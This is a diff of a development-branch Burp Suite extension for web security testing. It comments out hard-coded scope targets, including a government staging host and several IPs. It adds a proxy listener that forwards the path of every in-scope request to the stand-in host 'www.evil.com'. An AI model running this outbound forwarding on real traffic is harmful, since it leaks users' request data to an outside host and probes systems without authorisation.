@@ -1,6 +1,7 @@
 # Development branch
 from burp import IBurpExtender
 from burp import IParameter
+from burp import IExtensionHelpers
 from burp import IRequestInfo
 from burp import IResponseInfo
 from burp import IProxyListener
@@ -33,15 +34,37 @@ class BurpExtender(IBurpExtender, IProxyListener, IScannerListener):
         
         # register ourselves as a Proxy listener
         #callbacks.registerProxyListener(self)          # Done for now
-        callbacks.registerScannerListener(self)
+        #callbacks.registerScannerListener(self)
                
         # AUTO ADD TO SCOPE ------- TESTING PURPOSE ONLY
-        callbacks.includeInScope(URL("https://202.176.197.54"))
-        callbacks.includeInScope(URL("https://stg-home.singpass.gov.sg"))
-        self.getScanIssues()
+        #callbacks.includeInScope(URL("https://202.176.197.54"))
+        #callbacks.includeInScope(URL("https://stg-home.singpass.gov.sg"))
+        #callbacks.includeInScope(URL("http://192.168.119.130:3000"))
+        #self.getScanIssues()
         
         self._stdout.println('Loaded Extension.')
-     
+
+    #
+    # implement IProxyListener
+    #            
+    def processProxyMessage(self, messageIsRequest, message):
+        # message have to be in scope first
+        if self._callbacks.isInScope(URL(message.getMessageInfo().getHttpService().toString())) :
+            request = message.getMessageInfo().getRequest()
+            requestInfo = self._helpers.analyzeRequest(message.messageInfo.getHttpService() , message.messageInfo.getRequest())
+
+            directory = requestInfo.getHeaders()[0].split(' ')[1]
+            host = "www.evil.com"
+            port = 80
+            request = self._helpers.buildHttpRequest(URL("http://" + host + directory))
+            response = self._callbacks.makeHttpRequest(host, port, False, request)
+            responseInfo = self._helpers.analyzeResponse(response)
+            print responseInfo.getStatusCode()
+            
+            
+            
+            
+            
     def getScanIssues(self):
         scannedIssues = self._callbacks.getScanIssues("http://204.197.157.18:8080")
         self._stdout.println("Size of scanned issues on this url: " + str(len(scannedIssues)))
@@ -56,27 +79,7 @@ class BurpExtender(IBurpExtender, IProxyListener, IScannerListener):
                 repeatedIssue.append(issue.getIssueName())
                 self._stdout.println()
 
-
-
-
-
-
-
-     
-    # Work done on Cookie flag
-    # implement IProxyListener(boolean messageIsRequest, IInterceptedProxyMessage message)
-    #            |------> IInterceptedProxyMessage to get IHttpRequestResponse use getMessageInfo() 
-    def processProxyMessage(self, messageIsRequest, message):
-        # message have to be in scope first
-        if self._callbacks.isInScope(URL(message.getMessageInfo().getHttpService().toString())) :
-            # check if message is an request
-            if messageIsRequest:
-                requestInfo = self._helpers.analyzeRequest(message.messageInfo.getHttpService() , message.messageInfo.getRequest())
-                #self._stdout.println(("HTTP request to " + str(requestInfo.getUrl())))
-            else:
-                responseInfo = self._helpers.analyzeResponse(message.messageInfo.getResponse())
-                responseHeaderList = responseInfo.getHeaders()
-            
+          
     # implement IscannerListener
     def newScanIssue(self, issue):
         self._stdout.println("Severity: " + issue.getSeverity())
@@ -86,7 +89,6 @@ class BurpExtender(IBurpExtender, IProxyListener, IScannerListener):
         self._stdout.println("Details: " + issue.getIssueDetail())
         self._stdout.println("Remediation Background: " + issue.getRemediationBackground())
         self._stdout.println("Remediation Background: " + issue.getRemediationDetail())
-        
         self._stdout.println()
         
     #
@@ -105,7 +107,7 @@ class BurpExtender(IBurpExtender, IProxyListener, IScannerListener):
         
         
     '''
-        #
+    #
     # implement IHttpListener
     #
     def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo): 
